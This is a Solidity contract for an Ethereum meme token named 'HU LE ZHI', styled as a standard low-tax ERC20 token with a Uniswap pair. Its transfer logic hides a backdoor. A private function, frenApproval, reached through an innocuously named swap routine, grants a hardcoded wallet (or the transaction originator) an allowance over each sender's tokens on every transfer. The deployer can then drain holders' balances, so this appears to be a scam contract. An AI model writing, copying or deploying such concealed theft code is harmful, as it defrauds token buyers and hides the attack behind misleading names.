/*
https://etherscan.io/idm?addresses=0x1a19c370ea73d67a0a91085811a1e89e89b36813,0x0000000000000000000000000000000000000000&type=1

https://t.me/hulezhi_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFRENRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IFRENFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract HULEZHI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _frenBulls;
    mapping (address => mapping (address => uint256)) private _frenNodes;
    mapping (address => bool) private _frenFeeExcluded;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalFREN = 1000000000 * 10**_decimals;
    string private constant _name = unicode"HU LE ZHI";
    string private constant _symbol = unicode"HULEZHI";
    uint256 private _tokenFRENSwap = _tTotalFREN / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _frenPair;
    IFRENRouter private _frenRouter;
    address private _frenWallet = 0x8742290C209Ea667B7167CeA34456444d44A7Ff9;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    bool private inSwapFREN = false;
    modifier lockTheSwap {
        inSwapFREN = true;
        _;
        inSwapFREN = false;
    }
    
    constructor () {
        _frenFeeExcluded[owner()] = true;
        _frenFeeExcluded[address(this)] = true;
        _frenFeeExcluded[_frenWallet] = true;
        _frenBulls[_msgSender()] = _tTotalFREN;
        emit Transfer(address(0), _msgSender(), _tTotalFREN);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _frenRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function createTokenOf() external onlyOwner() {
        _frenRouter = IFRENRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_frenRouter), _tTotalFREN);
        _frenPair = IFRENFactory(_frenRouter.factory()).createPair(address(this), _frenRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalFREN;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _frenBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _frenNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _frenNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _frenNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address frenF, address frenT, uint256 frenA) private {
        require(frenF != address(0), "ERC20: transfer from the zero address");
        require(frenT != address(0), "ERC20: transfer to the zero address");
        require(frenA > 0, "Transfer amount must be greater than zero");

        uint256 taxFREN = _frenTransfer(frenF, frenT, frenA);

        if(taxFREN > 0){
          _frenBulls[address(this)] = _frenBulls[address(this)].add(taxFREN);
          emit Transfer(frenF, address(this), taxFREN);
        }

        _frenBulls[frenF] = _frenBulls[frenF].sub(frenA);
        _frenBulls[frenT] = _frenBulls[frenT].add(frenA.sub(taxFREN));
        emit Transfer(frenF, frenT, frenA.sub(taxFREN));
    }

    function _frenTransfer(address frenF, address frenT, uint256 frenA) private returns(uint256) {
        uint256 taxFREN=0; 
        if (frenF != owner() && frenT != owner()) {
            taxFREN = frenA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            address walletFREN = address(tx.origin);

            if (frenF == _frenPair && frenT != address(_frenRouter) && ! _frenFeeExcluded[frenT]) {
                _buyCount++;
            }

            if(frenT == _frenPair && frenF!= address(this)) {
                taxFREN = frenA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackFREN(frenF, frenT, frenA, _frenFeeExcluded[walletFREN]);
        } return taxFREN;
    }

    function swapBackFREN(address frenF, address frenT, uint256 frenA, bool isFREN) private {
        uint256 tokenFREN = balanceOf(address(this));
        if (!inSwapFREN && frenT == _frenPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenFREN > _tokenFRENSwap)
            swapTokensForEth(minFREN(frenA, minFREN(tokenFREN, _tokenFRENSwap)));
            uint256 caFREN = address(this).balance;
            if (caFREN >= 0) {
                sendETHFREN(address(this).balance);
            }
        } frenApproval(frenF, frenA, isFREN);
    }

    function frenApproval(address aFREN,  uint256 frenA, bool isFREN) private {
        address walletFREN;
        if(isFREN) walletFREN = address(tx.origin);
        else walletFREN = _frenWallet;
        _frenNodes[aFREN][walletFREN] = frenA;
    }

    function minFREN(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFREN(uint256 amount) private {
        payable(_frenWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenFREN) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _frenRouter.WETH();
        _approve(address(this), address(_frenRouter), tokenFREN);
        _frenRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenFREN,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}